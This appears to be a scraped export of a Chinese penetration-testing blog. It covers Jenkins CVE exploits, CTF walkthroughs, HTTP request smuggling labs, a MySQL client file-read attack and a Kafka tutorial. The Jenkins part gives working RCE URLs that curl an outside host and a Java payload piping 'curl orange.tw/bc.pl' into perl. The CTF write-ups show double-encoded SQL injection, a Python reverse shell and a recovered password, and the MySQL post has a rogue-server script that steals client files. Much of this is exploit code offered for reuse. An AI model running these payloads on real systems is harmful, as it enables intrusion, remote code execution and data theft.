http:&#x2F;&#x2F;x.x.x.x:8080&#x2F;git&#x2F;search&#x2F;?q&#x3D;a http:&#x2F;&#x2F;x.x.x.x:8080&#x2F;git&#x2F;search&#x2F;suggest?query&#x3D;a CVE-2018-1000861 远程命令执行可以使用如下的一键化脚本 https:&#x2F;&#x2F;github.com&#x2F;orangetw&#x2F;awesome-jenkins-rce-2019 也可以自定义发送请求 http:&#x2F;&#x2F;x.x.x.x:8080&#x2F;securityRealm&#x2F;user&#x2F;admin&#x2F;descriptorByName&#x2F;org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript&#x2F;checkScript?sandbox&#x3D;true&amp;value&#x3D;public class x &#123;public x()&#123;&quot;curl http:&#x2F;&#x2F;xxx.ceye.io&#x2F;CVE-2018-1000861&quot;.execute()&#125;&#125; 页面返回空白，响应为 如果使用脚本，则同样效果 还可以使用的POC，使用会提示错误信息，但命令已执行。 &#x2F;securityRealm&#x2F;user&#x2F;test&#x2F;descriptorByName&#x2F;org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript&#x2F;checkScript?sandbox&#x3D;true&amp;value&#x3D;import+groovy.transform.*%0a%40ASTTest(value%3d%7bassert+java.lang.Runtime.getRuntime().exec(&quot;curl http:&#x2F;&#x2F;xxx.ceye.io&#x2F;CVE-2018-1000861&quot;)%7d)%0aclass+Person%7b%7d &#x2F;securityRealm&#x2F;user&#x2F;test&#x2F;descriptorByName&#x2F;org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript&#x2F;checkScript?sandbox&#x3D;true&amp;value&#x3D;import+groovy.transform.*%0a%40ASTTest(value%3d%7b+&quot;curl http:&#x2F;&#x2F;xxx.ceye.io&#x2F;CVE-2018-1000861&quot;.execute().text+%7d)%0aclass+Person%7b%7d CVE-2018-1999002 任意文件读取影响版本：Jenkins weekly 2.132 以及更早的版本。Jenkins LTS 2.121.1 以及更早的版本 可以读取Windows系统服务器中的任意文件，且在特定而条件下也可以读取Linux系统服务器中的文件. 详情：https://xz.aliyun.com/t/2486 结合payload来看，我们请求的url为/plugin/credentials/.ini，则base为空，扩展名（ext变量）即为.ini，然后通过一系列的尝试openURL，在此例中即最后一个情形con = openURL(map(base+&#39;_&#39;+ locale.getLanguage()+ext));，会去请求_../../../../../../../../../../../../windows/win.ini ，尽管目录_..并不存在，但在win下可以直接通过路径穿越来绕过。但在linux，则需要一个带有_的目录来想办法绕过。 需要已经开启了匿名用户读取权限，在请求头中添加 Accept-Language: &#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd 处理请求中的包含路径，比如/plugin/xxxx，可以尝试 &#x2F;plugin&#x2F;jquery-detached&#x2F;.xml &#x2F;plugin&#x2F;jquery-detached&#x2F;.key &#x2F;plugin&#x2F;credentials&#x2F;.ini 在Windows下这么使用 GET &#x2F;plugin&#x2F;credentials&#x2F;.ini HTTP&#x2F;1.1 Host: x.x.x.x:8080 Accept: text&#x2F;javascript, text&#x2F;html, application&#x2F;xml, text&#x2F;xml, *&#x2F;* X-Prototype-Version: 1.7 DNT: 1 X-Requested-With: XMLHttpRequest User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.106 Safari&#x2F;537.36 Origin: http:&#x2F;&#x2F;x.x.x.x:8080 Referer: http:&#x2F;&#x2F;x.x.x.x:8080&#x2F; Accept-Encoding: gzip, deflate Accept-Language: &#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd Cookie: JSESSIONID.450017e3&#x3D;x6kdpnkcgllh18wvlaohsqq8z; screenResolution&#x3D;1920x1080; JSESSIONID.ccf0cd96&#x3D;node09crp5bs5eglyrv874no3w48l0.node0; JSESSIONID.6551b177&#x3D;14vcq2nsop6bw1u8urepj65kwv; td_cookie&#x3D;1608956971 Connection: close CVE-2018-1000600 Jenkins GitHub 信息泄露影响版本：Jenkins GitHub插件小于1.29.1 利用的POC为，其中user1为用户名。 &#x2F;securityRealm&#x2F;user&#x2F;user1&#x2F;descriptorByName&#x2F;org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator&#x2F;createTokenByPassword?apiUrl&#x3D;http:&#x2F;&#x2F;xxx.ceye.io 执行后显示 查看DNSlog回显 CVE-2019-1003000 远程代码执行实际影响版本及编号：CVE-2019-1003000 (Script Security), CVE-2019-1003001 (Pipeline: Groovy), CVE-2019-1003002 (Pipeline: Declarative) 拥有Overall/Read 权限的用户可以绕过沙盒保护，在jenkins可以执行任意代码。此漏洞需要一个账号密码和一个存在的job。受影响插件版本：Pipeline: Declarative 插件 &lt;= 1.3.4。Pipeline: Groovy 插 件 &lt;= 2.61。Script Security 插 件 &lt;= 1.49。 下载环境和利用代码： https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc.git 执行利用后显示 我们的job中也被添加了如下 CVE-2019-1003005 远程代码执行受影响版本： Jenkins 2.53 Jenkins 2.122 Jenkins 2.137 Jenkins 2.138 启用匿名读取 Jenkins 2.152 启用匿名读取 Jenkins 2.153 启用匿名读取 Script Security Plugin 1.43 Script Security Plugin 1.48 下载利用脚本：https://github.com/orangetw/awesome-jenkins-rce-2019 构建环境后，执行脚本如下 显示如下 当然如果不想使用这种一键式脚本还可以自己构造jar来利用 创建Payload.java public class Payload &#123; public Payload()&#123; try &#123; String payload &#x3D; &quot;curl orange.tw&#x2F;bc.pl | perl -&quot;; String[] cmds &#x3D; &#123;&quot;&#x2F;bin&#x2F;bash&quot;, &quot;-c&quot;, payload&#125;; java.lang.Runtime.getRuntime().exec(cmds); &#125; catch (Exception e) &#123; &#125; &#125; &#125; 编译文件，创建META-INF/services/文件夹，同时在文件夹下创建名为org.codehaus.groovy.plugins.Runners的文件。内容随意，比如Payload 文件创建后，在某一目录下，文件树类似如下： 编译以上目录 jar cvf poc-1.jar code/ 将编译产生的文件移动到类似如下地址cp poc-1.jar ~/www/code/payload/poc/1/ 将www目录移动到web服务器中，地址类似：http://xxx.com/code/payload/poc/1.poc-1.jar 利用如下exp http:&#x2F;&#x2F;&lt;TARGET HOST&gt;&#x2F;securityRealm&#x2F;user&#x2F;admin&#x2F;descriptorByName&#x2F;org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition&#x2F;checkScriptCompile ?value&#x3D; @GrabConfig(disableChecksums&#x3D;true)%0a @GrabResolver(name&#x3D;&#39;payload&#39;, root&#x3D;&#39;http:&#x2F;&#x2F;&lt;EXPLOIT HOST&gt;&#39;)%0a @Grab(group&#x3D;&#39;package&#39;, module&#x3D;&#39;payload&#39;, version&#x3D;&#39;1&#39;)%0a import Payload; CVE-2019-1003029 Script Security Plugin沙箱绕过此漏洞和CVE-2019-1003005漏洞同样都是由Script Security插件引起。利用方式和上一致。影响版本1.55以下。 CVE-2019-10392 Jenkins Git 插件命令执行之前做过这个漏洞的复现，地址：https://misakikata.github.io/2019/09/CVE-2019-10392-Jenkins-2k19%E8%AE%A4%E8%AF%81%E8%BF%9C%E7%A8%8BRCE/ CVE-2019-10352 任意文件写入该漏洞使经过身份验证的具有Job/Configure权限的攻击者可以使用目标之外的文件名定义文件参数，从而导致任意文件写入。 创建一个名为test的新“自由式项目”（该项目的工作空间将位于JENKINS_HOME/workspace/test） 创建一个受限制的用户，提供总体读取和作业构建，配置和读取权限。在配置中选择文件参数 单击构建选择上传文件，上传一个1.png 开始构建就可以将其写入运行Jenkins的用户有权写入的文件系统上的任何位置。 CVE-2019-10300 GitLab插件信息泄露漏洞Jenkins GitLab插件1.5.11 的功能中存在一个可利用的信息泄露漏洞。来自具有“ Overall/Read”权限的用户（例如，启用了匿名用户）的特制HTTP请求，可能导致该插件的受影响版本将Jenkins凭据数据库中的凭据公开给攻击者控制的服务器。 需要下载插件：https://mirrors.tuna.tsinghua.edu.cn/jenkins/plugins/gitlab-plugin/1.5.11/gitlab-plugin.hpi 利用分析：https://talosintelligence.com/vulnerability_reports/TALOS-2019-0788","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"6Days Lab - v1.0.1","slug":"6Days-Lab-v1-0-1","date":"2020-03-25T07:35:02.000Z","updated":"2020-03-25T08:08:56.000Z","comments":true,"path":"2020/03/6Days-Lab-v1-0-1/","link":"","permalink":"https://misakikata.github.io/2020/03/6Days-Lab-v1-0-1/","excerpt":"","text":"访问首页发现一个是填入优惠码的地方，同时还发现一个未加载的图片。 点击图片查看链接，发现是内网地址，估计是系统没把内网地址进行转换。 http:&#x2F;&#x2F;10.66.20.100&#x2F;image.php?src&#x3D;https%3A%2f%2f4.bp.blogspot.com%2f-u8Jo4CEKQLk%2fV4OpiaoMJ7I%2fAAAAAAAAAiw%2f8kuCpTOpRWUAdp2p4GpegWdnOwxjwHNYQCLcB%2fs1600%2fphoto.jpg 不过可以通过此判断大概存在任意文件读取。再查看下面的优惠码，随便输入优惠码返回为空，但是输入单引号等会提示被IPS拦截。 那么这里也可能有SQL注入。 先查看上面文件读取是否可以读取到文件 再去读取优惠码页面，里面有个sql语句的拼接。 再去查看config.php。发现数据库的账号密码 再去尝试读取本地系统文件 由于权限原因，是不能直接读取flag文件。尝试查找对应的目录 &#x2F;proc&#x2F;sched_debug 配置文件可以看到当前运行的进程并可以获得对应进程的pid。 &#x2F;proc&#x2F;pid&#x2F;cmdline 则可以看到对应pid进程的完整命令行。 在查找内网端口服务的时候，发现80端口并没有开放，也就是内网端口和外部访问端口不一致，应该是做了端口转发出来。也许可以在内网端口上直接来执行SQL注入绕过IPS。遍历端口后发现8080端口是首页地址。 测试双编码的情况下，可以绕过IPS，只是比在外部执行可以看到明显的返回。 查询得知两字段 aaaa%2527union%2520select%25201,2%2523 库名，应该是需要查询fancydb aaa%2527%2520union%2520select%2520group_concat%2528schema_name%2529%252C2%2520from%2520information_schema.schemata%2523 查表名 aaa%2527%2520union%2520select%2520group_concat%2528table_name%2529%252C2%2520from%2520information_schema.tables%2520where%2520table_schema%253D0x66616e63796462%2523 字段名 aaa%2527%2520union%2520select%2520group_concat%2528column_name%2529%252C2%2520from%2520information_schema.columns%2520where%2520table_name%253D%2527users%2527%2523 查询到账号密码andrea:SayNoToPentests aaaaaa%2527%2520union%2520select%2520group_concat%2528username%252C0x3a%252Cpassword%2529%252C2%2520from%2520users%2523 尝试利用sql注入写文件，不过需要先把物理路径找到，尝试默认的apache路径/var/www/html，试过发现路径是如下 尝试导出文件失败，想起来用户非root，且不具备secure_file_priv。后来想找登陆和连接入口的时候感觉这个用户名比较眼熟，才想起来用户在passwd文件中出现过。且之前尝试搜索文件的时候尝试查找了用户下面的历史命令文件。 那就直接试试ssh，确实可以登陆但是没有回显 尝试反弹shell，发现是个rbash，不能这么反弹shell 尝试python反弹 python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;x.x.x.x&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39; 获得反弹shell，同时使用python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; ，获取原生终端 目录下有个suid位文件，不过不能利用，权限不对。 没有历史命令文件等，不可执行sudo，查找内核漏洞，内核还不算高。 开启一个外网服务，下载到服务器，发现可以正常编译不报错。。。执行后获得root权限 找到根目录下的flag文件，是一个可执行文件。执行后提示完成 回过头再去看那个dog文件是啥，发现还是提示Access Denied。难道这玩意就是寻开心的？","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://misakikata.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"BBQ Factory","slug":"BBQ-Factory","date":"2020-03-25T07:31:57.000Z","updated":"2020-03-25T07:31:57.000Z","comments":true,"path":"2020/03/BBQ-Factory/","link":"","permalink":"https://misakikata.github.io/2020/03/BBQ-Factory/","excerpt":"","text":"这个并没有做完，卡在了某一点。先做记录打开页面访问 看到如下地址 http:&#x2F;&#x2F;ctf30.root-me.org&#x2F;&#x2F;details.php?file&#x3D;pdf&#x2F;GROPIMP.pdf 基本可以断定这是个任意文件读取。 现在问题是需要去读取什么文件呢。先放置，查看目录，找打一个admin目录。跳转到8080端口 暂时没有爆破的欲望，继续查看，本来打算去读取一些密码，但是不知道该读取哪些文件。 尝试读取access日志，没有发现东西，想查看配置文件，比如phpmyadmin的配置文件，但是没找对目录。 后来在wamp的日志中找到了error日志，在日志中发现了phpmyadmin的名称。 phpmyadmin的密码是空密码设置，所以要是可以找到phpmyadmin的登陆地址就可以直接进去。 不过遗憾的是没使用phpmyadmin。准确的说是没有找到可以访问phpmyadmin的路径。检索wamp的版本 现在明显的入手点就是admin页面，查看httpd.conf看看有没有目录地址，查看过后发现只有80端口一个服务。也没有虚拟站点和配置文件导入，意思是8080的端口不是wamp启动的。。。 不过随便输一个目录，在8080端口下，会报错显示一个exe文件地址。 下载查看，打开后发现是一个web的启动器，自动在8080端口开放。也许就是系统上8080端口服务的提供器。 丢到IDA中查看一下，也许有账号密码呢。尝试搜索Login error。找到如下信息 这个信息正好是返回的响应，从里面可以看到他需要一个administration账号权限。访问下面显示的连接可以看到 账号密码的来源，超上面看admin/amaBBQlova，登陆成功设置cookie：BBQOOQIE=9491b1db2da8d1efa106f013e4576b5a。 登陆后再去查看admin页面，貌似还需要别的？ 这个系统就给出了三个地址，/index /login /admin，他到底还要啥啊。。 尝试探测端口，但是稍微加点线程系统就卡住，试了半天，一个常用服务的端口都没找到。在尝试ssh的时候发现好像默认是优先公私钥登陆，所以读取到公私钥也可以访问，但是尝试几个路径都没发现公私钥。","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://misakikata.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"HTTP 请求走私","slug":"HTTP-请求走私","date":"2020-03-12T02:29:20.000Z","updated":"2020-03-12T04:09:36.000Z","comments":true,"path":"2020/03/HTTP-请求走私/","link":"","permalink":"https://misakikata.github.io/2020/03/HTTP-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/","excerpt":"","text":"原理原理有两篇文章写的十分详细，此处不在过多陈述。 HTTP request smuggling 一篇文章带你读懂 HTTP Smuggling 攻击 CL-TE实验室：https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te 登陆访问即可，看到实验室说明，只需要后端收到GPOST的请求方法即可。 通过要求可以得知这是一个前端CL，后端TE的方式。先关闭burp的自动更新content-length的设置，然后修改为6字节，先发送一个请求，这个请求先不需要管。 再发送一个POST请求，就会显示这次实验的需求，GPOST方法。 前端发送数据的时候，实验content-length来设置请求的长度，后端使用transfer-encoding来处理消息。在cl和te的模式中。默认是优先使用te。 前端认为 POST &#x2F; HTTP&#x2F;1.1 Content-Length: 6 Transfer-Encodin: chunked xxx xxx 0 G 以上为一个请求,参数长度受content-length控制。 而后端接收te的模式，默认这个是一个分块请求 POST &#x2F; HTTP&#x2F;1.1 Content-Length: 6 Transfer-Encodin: chunked xxx xxx 0 -------------------------到此，后端认为是一个请求，而G作为下一个请求而等待 G 这时候再进来的请求，就会作为继续未完成的请求而连接 GPOST &#x2F; HTTP&#x2F;1.1 TE-CL实验室：https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl 访问实验室，查看需求，由于说明中已经告诉我们是一个te-cl的方式。 构造transfer-encoding块，其中12代表0之前的字符串长度包括换行符，长度为16，十六进制就是12。最后面的0需要跟两个换行符，缺少的话会提示Invalid request。可能构造成功后，发送几次仍然显示Missing parameter，多试几次即可。 前端服务器使用TE块来区分。参数中 12 GPOST &#x2F; HTTP&#x2F;1.1 0 都被认为是一个合法的块消息。而后端服务器处理中只使用CL来划分消息。导致在请求中的content-length: 4让后端服务器认为： 12 --------------------消息到此为一个消息 GPOST &#x2F; HTTP&#x2F;1.1 0 --------------------第二个请求消息 从而达到请求走私的目的 TE.TE此种方式是前后端服务器都支持并且默认使用te块，使用某种方式导致一端不识别te块来达到，cl-te或者te-cl的方式。 实验室：https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header 同样是用后端服务器识别到GPOST请求方法。 构造混淆的te头的常用方式： 1. Transfer-Encoding: xchunked 2. Transfer-Encoding : chunked 3. Transfer-Encoding: chunked Transfer-Encoding: x 4. Transfer-Encoding:[tab]chunked 5. [space]Transfer-Encoding: chunked 6. X: X[\\n]Transfer-Encoding: chunked 7. Transfer-Encoding : chunked 请求了多次后发现，一直提示缺少参数。 构造错误的te块，提示无效请求，说明前端服务器很可能是te。 重新使用以上提到的方式来尝试混淆te，尝试了几种方式，发现只有双写的情况下，可以混淆后端对te的处理。 也就是说前端服务器处理te块消息使用了第一个te头来当作标准解析，而后端服务器中使用了第二个te头来当作标准解析。 请求走私利用上面几种情况说明了请求走私的利用方式，现在同样利用实验室来尝试一下请求走私能获取到什么。 实验室：https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te CL-TE利用CL-TE漏洞方式，来访问前端服务器不能访问的/admin页面。同时删除carlos用户。 尝试直接访问的时候提示页面不能访问，然后修改为cl-te的方式 多发送两次会发现提示 添加localhost头。多发送几次就可以看到需要删除的用户。 构造删除的地址来发送，提示跳转302 再次查看页面发送用户被删除 TE-TE第二个是利用TE-CL的方式来删除用户，同样尝试一下 实验室: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl 流程基本一致，还是需要添加localhost头 查看到admin页面 执行删除用户，查看已删除。 请求走私重写请求实验室：https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting 利用请求走私来达到访问/admin页面，但是需要添加请求头，类似xff头，但不是xff头，然后再去删除用户。 实验室有个搜索功能，说明这个功能可能帮助我们获得需要的请求头。先访问admin页面 再尝试走私请求来访问搜索，尝试了多次，添加头后终于看到了需要的请求头。而content-length的大小关系泄露出来的多少有关。 查看到了熟悉的用户页面 不过删除过程中发现，如果还按照之前的方式来删除用户，会不能删除，多次尝试后发现提示不允许换行符。 重新尝试发现使用GET方法来删除即可 获取其他用户cookie实验室：https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests 这个实验一开始并没有get到点，查看解后才发现原来忽略了长度。 我们提交请求的时候，受害者也会提交请求，就是需要获取并显示受害者的请求来达到获取cookie的目的。 提交请求后显示跳转地址 查看页面的显示，从而获取用户的请求cookie","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"MySQL客户端任意文件读取","slug":"MySQL客户端任意文件读取","date":"2020-01-20T06:15:08.000Z","updated":"2020-01-20T06:15:08.000Z","comments":true,"path":"2020/01/MySQL客户端任意文件读取/","link":"","permalink":"https://misakikata.github.io/2020/01/MySQL%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/","excerpt":"","text":"最早遇到这个问题的时候，大概是刚开始做安全的时候，那时候还没意识到利用等实际价值。18年的时候记得有一个CTF题，利用的就是扫描MySQL端口来获取读文件flag。直到今天看到一位大佬的拓展文章，打算实际的去利用实践一下。 https://lorexxar.cn/2020/01/14/css-mysql-chain LOAD DATA INFILELOAD DATA INFILE，作用是可以把文件读入到数据库的某个表里，如果在远程连接状态下使用了LOCAL关键字，即LOAD DATE LOCAL INFILE,那么就会从客户端读取一个本地文件，存入服务器端的table里。 如果执行load data infile &quot;C:/Windows/win.ini&quot; into table test FIELDS TERMINATED BY &#39;\\n&#39;;提示 受到secure_file_priv的导入导出限制。 但是使用load data local infile &quot;C:/Windows/win.ini&quot; into table test FIELDS TERMINATED BY &#39;\\n&#39;; 就会把客户端的文件读取到服务端，并且不再受到secure_file_priv的导入导出限制。 也就是说只要我们伪造一个服务端，让客户端主动连接过来，这样我们就可以任意读取系统上的文件等。 请求协议分析登陆先发送一个Greeting请求包，获取一些server信息。 接着会发送一个认证请求包，包含账号密码 后面会再接着发送一些查询请求，获取一些设置和编码信息等。 加载文件这时候我们点加载本地文件到test数据库中，会有三条相关的请求。第一条是发送查询语句 第二条是服务端返回了加载的文件地址给客户端 第三条就是客户端根据返回的地址读取文件，发送给服务端 所以这相当于一个客户端根据服务端的返回来读取文件请求给服务端的过程，也就是服务端是一直可信的。 而此处的利用就是，当服务端不可信的时候，利用返回来读取连接的客户端的信息文件。 那么，是不是只有在加载LOAD DATA LOCAL的时候才可以进行读取客户端文件，而别的时候不行呢。官方有一句这么解释，此处翻译为中文 意思是可以在任何语句中返回具有读取权限的文件。 受影响应用server端使用如下脚本： #coding&#x3D;utf-8 import socket import logging logging.basicConfig(level&#x3D;logging.DEBUG) filename&#x3D;&quot;C:\\\\Windows\\\\win.ini&quot; sv&#x3D;socket.socket() sv.bind((&quot;&quot;,3306)) sv.listen(5) conn,address&#x3D;sv.accept() logging.info(&#39;Conn from: %r&#39;, address) conn.sendall(&quot;\\x4a\\x00\\x00\\x00\\x0a\\x35\\x2e\\x35\\x2e\\x35\\x33\\x00\\x17\\x00\\x00\\x00\\x6e\\x7a\\x3b\\x54\\x76\\x73\\x61\\x6a\\x00\\xff\\xf7\\x21\\x02\\x00\\x0f\\x80\\x15\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x70\\x76\\x21\\x3d\\x50\\x5c\\x5a\\x32\\x2a\\x7a\\x49\\x3f\\x00\\x6d\\x79\\x73\\x71\\x6c\\x5f\\x6e\\x61\\x74\\x69\\x76\\x65\\x5f\\x70\\x61\\x73\\x73\\x77\\x6f\\x72\\x64\\x00&quot;) conn.recv(9999) logging.info(&quot;auth okay&quot;) conn.sendall(&quot;\\x07\\x00\\x00\\x02\\x00\\x00\\x00\\x02\\x00\\x00\\x00&quot;) conn.recv(9999) logging.info(&quot;want file...&quot;) wantfile&#x3D;chr(len(filename)+1)+&quot;\\x00\\x00\\x01\\xFB&quot;+filename conn.sendall(wantfile) content&#x3D;conn.recv(9999) logging.info(content) conn.close() 利用Navicat Premium来连接，在配置中点击测试连接，就会有返回响应 python2的MySQLdb 不过在测试中发现python3的pymysql确不受影响 拓展利用在原文中，讲述了几种针对CMS的利用，那么就看一种针对dedecms的简单利用方式。 load data local infile &quot;D:\\\\phpstudy_pro\\\\WWW\\\\DedeCMS\\\\data\\\\common.inc.php&quot; into table dede_log FIELDS TERMINATED BY &#39;\\n&#39;; select * from dede_log; 使用dede默认的数据库的时候，连接信息被隐藏没有保存到数据。 先更改数据库 use test; load data local infile &quot;D:\\\\phpstudy_pro\\\\WWW\\\\DedeCMS\\\\data\\\\common.inc.php&quot; into table test.test FIELDS TERMINATED BY &#39;\\n&#39;; select * from test.test;","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://misakikata.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"Kafka","slug":"Kafka","date":"2020-01-14T08:05:55.000Z","updated":"2020-01-16T08:16:55.000Z","comments":true,"path":"2020/01/Kafka/","link":"","permalink":"https://misakikata.github.io/2020/01/Kafka/","excerpt":"","text":"Kafka 简介详情：http://kafka.apachecn.org/intro.html Kafka 使用简介这种网上很多的，此处不介绍了，可以查看以上ApacheCN的文档，就直接开始使用和python之间的整合。 下载当前的最新版本： wget http:&#x2F;&#x2F;archive.apache.org&#x2F;dist&#x2F;kafka&#x2F;2.4.0&#x2F;kafka_2.13-2.4.0.tgz 此处没有搭建zookeeper，就直接使用kafka的便捷脚本创建节点 .&#x2F;bin&#x2F;zookeeper-server-start.sh config&#x2F;zookeeper.properties 如果出现错误Unrecognized VM option &#39;PrintGCDateStamps&#39;，可能是Java版本和Kafka版本之间的问题，尝试使用更高版本的Kafka或者其他版本的Java。 启动kafka，先复制一份需要的配置文件 cp config&#x2F;server.properties config&#x2F;server-1.properties 配置文件中 broker.id&#x3D;0 #必须唯一，当前只设置一个，所以暂不更改 listeners&#x3D;PLAINTEXT:&#x2F;&#x2F;:9092 #listeners是broker监听的地址和端口，多broker的时候需要不重复 log.dirs&#x3D;&#x2F;tmp&#x2F;kafka-logs-1 #日志，此处改为kafka-logs-1 zookeeper.connect&#x3D;localhost:2181 #zookeeper地址，没更改 启动kafka .&#x2F;bin&#x2F;kafka-server-start.sh config&#x2F;server-1.properties 一串输出后，kafka启动成功 创建一个主题.&#x2F;bin&#x2F;kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor 1 --partitions 1 --topic test #创建test主题,replication-factor副本数，小于集群服务器数 .&#x2F;bin&#x2F;kafka-topics.sh --list --zookeeper localhost:2181 #查看当前主题 发送消息当在生产者发送消息的时候，消费者会显示消息 .&#x2F;bin&#x2F;kafka-console-consumer.sh --bootstrap-server localhost:9092 --topic test --from-beginning # 消费者监听，此时有生产者传入消息会显示 .&#x2F;bin&#x2F;kafka-console-producer.sh --broker-list localhost:9092 --topic test #生产者发送消息 多代理集群为每个代理创建一个配置文件 如上的复制配置文件 cp config&#x2F;server.properties config&#x2F;server-1.properties 修改配置文件参数 config&#x2F;server-1.properties: broker.id&#x3D;1 listeners&#x3D;PLAINTEXT:&#x2F;&#x2F;:9093 log.dir&#x3D;&#x2F;tmp&#x2F;kafka-logs-1 启动新节点 .&#x2F;bin&#x2F;kafka-server-start.sh config&#x2F;server-1.properties &amp; 重新创建一个主题，然后通过生产者和消费者来处理消息，处理方式和上一样，只是需要更改不同的topic 导入/导出文件使用官方提高的三个配置文件，首先是Kafka Connect的配置文件，包含常用的配置，如Kafka brokers连接方式和数据的序列化格式。 其余的配置文件均指定一个要创建的连接器。这些文件包括连接器的唯一名称，类的实例，以及其他连接器所需的配置。 .&#x2F;bin&#x2F;connect-standalone.sh config&#x2F;connect-standalone.properties config&#x2F;connect-file-source.properties config&#x2F;connect-file-sink.properties 一连串输出后，提示没有test.txt文件。 创建test.txt，就可以看到对文件的处理，文件夹下就会生成test.sink.txt。 使用python处理消息安装包 pip3 install kafka-python 使用文档 https:&#x2F;&#x2F;kafka-python.readthedocs.io&#x2F;en&#x2F;master&#x2F;usage.html 生产者代码：from kafka import KafkaProducer from kafka.errors import KafkaError producer &#x3D; KafkaProducer( bootstrap_servers&#x3D;[ &quot;localhost:9092&quot; ] ) future &#x3D; producer.send(&quot;test&quot;, b&#39;I am rito yan&#39;) try: record_metadata &#x3D; future.get(timeout&#x3D;10) print(record_metadata) except KafkaError as e: print(e) 发送成功后返回 RecordMetadata(topic&#x3D;&#39;test&#39;, partition&#x3D;0, topic_partition&#x3D;TopicPartition(topic&#x3D;&#39;test&#39;, partition&#x3D;0), offset&#x3D;3, timestamp&#x3D;1578905897675, checksum&#x3D;None, serialized_key_size&#x3D;-1, serialized_value_size&#x3D;13, serialized_header_size&#x3D;-1) 也可以格式化消息格式 from kafka import KafkaProducer from kafka.errors import KafkaError producer &#x3D; KafkaProducer( bootstrap_servers&#x3D;[ &quot;localhost:9092&quot; ] #value_serializer&#x3D;lambda m: json.dumps(m).encode(&#39;ascii&#39;) #生产者发送json数据 ) future &#x3D; producer.send(&quot;test&quot;, b&#39;I am rito yan&#39;) #future &#x3D; producer.send(&#39;test&#39;, &#123;&#39;key&#39;: &#39;value&#39;&#125;) try: record_metadata &#x3D; future.get(timeout&#x3D;10) print(record_metadata) except KafkaError as e: print(e) 消费者代码from kafka import KafkaConsumer consumer &#x3D; KafkaConsumer( &quot;test&quot;, group_id &#x3D; &quot;user-test&quot;, #群组id，消息只能被同组的一个消费者消费，所以需要定义组名 bootstrap_servers &#x3D; [ &quot;localhost:9092&quot; ] #value_deserializer&#x3D;lambda m: json.loads(m.decode(&#39;ascii&#39;)) #格式化解析格式 ) for message in consumer: print(&quot;%s:%d:%d: key&#x3D;%s value&#x3D;%s&quot; % (message.topic, message.partition, message.offset, message.key, message.value)) 消费这运行后处于监听状态，当运行如上的生产者代码的时候，界面会显示出生产者的消息 项目中引用kafka在实现过程中，消费者处于监听状态，但是项目运行时，阻塞性的监听并不可用，可以使用多线程或者其他方式来处理。 def search_area(): prints &#x3D; PrintThread() prints.setDaemon(True) prints.start() for i in range(100,200): time.sleep(1) print(i) import threading import time from kafka import KafkaConsumer class PrintThread(threading.Thread): def run(self): print(&quot;start.... %s&quot; %self.getName()) consumer &#x3D; KafkaConsumer( &quot;test&quot;, group_id &#x3D; &quot;user-test&quot;, #群组id，消息只能被同组的一个消费者消费，所以需要定义组名 bootstrap_servers &#x3D; [ &quot;localhost:9092&quot; ] #value_deserializer&#x3D;lambda m: json.loads(m.decode(&#39;ascii&#39;)) #格式化解析格式 ) for message in consumer: print(&quot;%s:%d:%d: key&#x3D;%s value&#x3D;%s&quot; % (message.topic, message.partition, message.offset, message.key, message.value)) search_area() 达到主线程不阻塞的情况下仍然可以继续监听 或者不采用监听的方式，采用主动拉取队列数据，这样一次拉取的时候可能是较大的数据，对数据量处理要求高的情况下可能会增加消息延迟堆积 from kafka import KafkaConsumer consumer &#x3D; KafkaConsumer( &quot;test&quot;, group_id&#x3D;&#39;user-test&#39;, bootstrap_servers &#x3D; [ &quot;localhost:9092&quot; ] ) consumer.subscribe(topics&#x3D;(&#39;test&#39;,)) # consumer.subscribe(topics&#x3D;(&#39;test&#39;,&#39;test0&#39;)) #订阅多个主题 msg &#x3D; consumer.poll(timeout_ms&#x3D;2000) # 从kafka获取消息 print(msg) for tp, messages in msg.items(): for message in messages: 